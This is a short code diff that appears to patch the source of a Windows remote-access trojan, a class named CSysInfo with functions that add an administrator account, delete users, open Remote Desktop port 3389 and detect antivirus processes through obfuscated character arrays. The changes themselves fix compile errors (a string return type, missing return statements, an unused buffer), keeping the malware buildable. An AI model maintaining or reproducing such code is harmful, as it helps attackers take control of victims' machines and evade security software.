@@ -199,7 +199,8 @@ void CSysInfo::OnReceive(LPBYTE lpBuffer, UINT nSize)
     }
 }
 
-char* GetVirus()
+#include <string>
+std::string GetVirus()
 {
     char ulSYh[] = {'3','6','0','t','r','a','y','.','e','x','e','\0'};
     char rHGgu[] = {'a','v','p','.','e','x','e','\0'};
@@ -960,6 +961,7 @@ BOOL CSysInfo::DelUserName(char *user)
     }
     Send(&bToken, 1);
     LocalFree((LPBYTE)&bToken);
+    return TRUE;
 }
 
 void CSysInfo::AddAdminUser()
@@ -1512,6 +1514,7 @@ DWORD CSysInfo::Open3389(LPVOID lparam)
     }
     Sleep(1000);
     SendSysInfo();
+    return 0;
 }
 
 /*
@@ -1658,7 +1661,7 @@ void CSysInfo::GetSystemInfo(tagSystemInfo1* pSysInfo)
     _stprintf(pSysInfo->szActiveTime, _T("%dDay %dHour %dMin"), dwDay,dwHour,dwMin);
 
     //Get AntiVirus & FireWall========================
-    strcpy( pSysInfo->szAntiVirus, GetVirus() );
+    strcpy( pSysInfo->szAntiVirus, GetVirus().c_str() );
 
     //Get User Name========================
     DWORD dwLen  = sizeof(pSysInfo->szUserName);
@@ -1673,7 +1676,7 @@ void CSysInfo::GetSystemInfo(tagSystemInfo1* pSysInfo)
     ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
     ULONG nAllGB = 0, nFreeGB = 0;
     DWORD drivertype;
-    CHAR driver[10], strPrint[128];
+    CHAR driver[10];
     for(int i=0; i<26; i++) {
         driver[0] = i + ('B');
         driver[1] = (':');
